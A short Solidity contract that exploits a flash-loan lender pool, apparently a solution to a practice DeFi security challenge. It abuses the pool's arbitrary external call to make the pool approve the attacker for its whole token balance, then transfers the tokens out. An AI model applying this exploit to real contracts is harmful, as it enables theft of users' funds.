// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IAttackTrusterLenderPool {

  function flashLoan(
    uint256 borrowAmount,
    address borrower,
    address target,
    bytes calldata data
  ) external;

}

contract AttackTrusterLenderPool {

  address internal poolAddress;
  address internal tokenAddress;
  uint256 internal _tokensInPool;

  constructor(address pool, address token, uint256 tokensInPool) {
    poolAddress = pool;
    tokenAddress = token;
    _tokensInPool = tokensInPool;
  }

  function attack() public {
    IAttackTrusterLenderPool _pool = IAttackTrusterLenderPool(poolAddress);
    IERC20 _token = IERC20(tokenAddress);

    // execute the flashLoan, borrowing 0 to ensure balanceAfter is satisfied
    _pool.flashLoan(
      0,
      address(this),
      tokenAddress,
      abi.encodeWithSignature('approve(address,uint256)', address(this), _tokensInPool)
    );

    // transfer the new allowance amount to the attacker
    _token.transferFrom(poolAddress, msg.sender, _tokensInPool);
  }

}
